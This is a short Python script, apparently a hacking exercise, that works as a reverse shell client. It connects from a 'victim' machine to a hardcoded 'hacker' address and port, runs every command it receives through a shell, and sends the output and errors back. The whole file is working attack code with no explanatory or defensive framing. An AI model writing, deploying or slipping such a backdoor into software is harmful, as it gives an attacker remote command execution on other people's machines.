import socket
import subprocess # To start the shell in the system

def main():
    victim_socket= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    hacker_IP="192.168.0.28"
    hacker_Port=8008

    hacker_address=(hacker_IP, hacker_Port)
    victim_socket.connect(hacker_address)

    
    
    while True:
        data= victim_socket.recv(1024)
        data=data.decode()
        print(data)
                
        if 'q' in data:
            break
        else:
            CMD = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            victim_socket.send( CMD.stdout.read() ) # send back the result
            victim_socket.send( CMD.stderr.read() ) # send back the error -if any-, such as syntax error
            
    victim_socket.close()


if __name__ =="__main__":
    main()